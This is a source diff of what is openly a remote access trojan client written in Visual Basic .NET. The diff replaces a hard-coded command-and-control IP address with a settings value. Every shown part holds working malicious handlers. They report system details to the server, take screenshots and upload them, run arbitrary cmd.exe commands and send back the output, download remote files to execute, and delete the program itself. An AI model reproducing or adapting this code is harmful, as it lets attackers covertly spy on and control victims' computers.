@@ -53,7 +53,7 @@ Public Class MainForm
         Dim latency As String = ""
 
         Try
-            Dim address As IPAddress = Dns.GetHostAddresses(New Uri("http://185.62.188.189/RAT/" & "clients.php?action=writeme").Host)(0)
+            Dim address As IPAddress = Dns.GetHostAddresses(New Uri(My.Settings.vpsurl & "clients.php?action=writeme").Host)(0)
             latency = New Ping().Send(address).RoundtripTime.ToString()
         Catch Ex As Exception
             latency = "Unknown Error"
@@ -85,7 +85,7 @@ Public Class MainForm
         Dim cpuCounter As PerformanceCounter = New PerformanceCounter("Processor", "% Processor Time", "_Total")
         Dim GetCPU As String = String.Format("{0:f0}", Convert.ToSingle(cpuCounter.NextValue()))
 
-        Dim apiResponse As String = New WebClient().DownloadString("http://185.62.188.189/RAT/" &
+        Dim apiResponse As String = New WebClient().DownloadString(My.Settings.vpsurl &
         "clients.php?action=writeme&ping=" & GetPing() &
         "&ram=" & GetGBRamAmount() &
         "&cpu=" & GetCPU &
@@ -112,7 +112,7 @@ Public Class MainForm
     End Sub
 
     'Private Sub DefineEOFArgVar(ByRef EOFArg As String())
-    '   EOFArg = {"http://185.62.188.189/RAT/"}
+    '   EOFArg = {My.Settings.vpsurl}
     'End Sub
 
     Public Sub MainForm_Load(sender As Object, e As EventArgs) Handles MyBase.Load
@@ -128,7 +128,7 @@ Public Class MainForm
 
         ' Only for debugging purposes. I don't want to put the raw ip of my vps on Github, so
         ' I put it in a file which the stub reads automatically.
-        'EOFArguments = {"http://185.62.188.189/RAT/"} '{File.ReadAllText("C:\MeteorLogger\vpsurl.txt")}
+        'EOFArguments = {My.Settings.vpsurl} '{File.ReadAllText("C:\MeteorLogger\vpsurl.txt")}
 
         CheckForIllegalCrossThreadCalls = False
         mainBW.RunWorkerAsync()
@@ -142,7 +142,7 @@ Public Class MainForm
             ' cap.Dispose()
 
             ' Dim client As New WebClient
-            ' client.UploadData("http://185.62.188.189/RAT/" & "clients.php?action=uploadscreenshot&actioncontent=test.jpeg", cap.QueryFrame.ToImage)
+            ' client.UploadData(My.Settings.vpsurl & "clients.php?action=uploadscreenshot&actioncontent=test.jpeg", cap.QueryFrame.ToImage)
 
         ElseIf actionType = "screenshare" Then
             If Screenshare.screenshareBW Is Nothing Then
@@ -164,23 +164,23 @@ Public Class MainForm
         ElseIf actionType = "screenshot" Then
             Dim screenGrab As Bitmap = Screenshare.TakeBitmapScreenshot()
             Dim bmpBytes As Byte() = Screenshare.ResizeConvertBMP(screenGrab, 75L)
-            mainWebClient.UploadData("http://185.62.188.189/RAT/" & "clients.php?action=uploadscreenshot&actioncontent=" + actionContent(0), bmpBytes)
+            mainWebClient.UploadData(My.Settings.vpsurl & "clients.php?action=uploadscreenshot&actioncontent=" + actionContent(0), bmpBytes)
 
         ElseIf actionType = "runwincmd" Then
             Dim shellReply As String
             shellReply = Convert.ToBase64String(Encoding.UTF8.GetBytes(ShellRun("cmd.exe /c " & actionContent(0))))
-            mainWebClient.UploadString("http://185.62.188.189/RAT/", "clients.php?action=sendshellreply&actioncontent=" & shellReply)
+            mainWebClient.UploadString(My.Settings.vpsurl, "clients.php?action=sendshellreply&actioncontent=" & shellReply)
 
         ElseIf actionType = "shutdownrat" Then
-            Environment.Exit(1)
+            Environment.Exit(0)
 
         ElseIf actionType = "rebootrat" Then
             Shell(Application.ExecutablePath)
-            Environment.Exit(1)
+            Environment.Exit(0)
 
         ElseIf actionType = "uninstallrat" Then
             Process.Start("cmd.exe", "/C choice /C Y /N /D Y /T 1 & Del " + Application.ExecutablePath)
-            Environment.Exit(1)
+            Environment.Exit(0)
 
         ElseIf actionType = "msgbox" Then
             MsgBox(actionContent(0),, "")
@@ -192,21 +192,21 @@ Public Class MainForm
             Invoke(Sub() RemoteChat.Hide())
 
 
-            '  ElseIf actionType = "raisePerm" Then
-            '     Dim raiseperm As New Process()
-            '       New raiseperm() With { .StartInfo = { .FileName = Application.ExecutablePath, .UseShellExecute = True, .Verb = "runas"} }.Start()
-            '      Try
+            'ElseIf actionType = "raisePerm" Then
+            '   Dim raiseperm As New Process()
+            '         New raiseperm() With { .StartInfo = { .FileName = Application.ExecutablePath, .UseShellExecute = True, .Verb = "runas"} }.Start()
+            '        Try
             '     Process.GetCurrentProcess().Kill()
-            '    Catch
-            '   Environment.[Exit](0)
-            '  End Try
+            'Catch
+            '    Environment.[Exit](0)
+            'End Try
 
         ElseIf actionType = "camerashare" Then
 
         ElseIf actionType = "remotexec" Then
             Dim filename As String = actionContent(0)
             Dim client As New WebClient
-            client.DownloadFile("http://185.62.188.189/RAT/" & "/files/" & filename, filename)
+            client.DownloadFile(My.Settings.vpsurl & "/files/" & filename, filename)
             Try
                 File.Move(filename, Path.GetTempPath & filename)
                 File.Delete(filename)
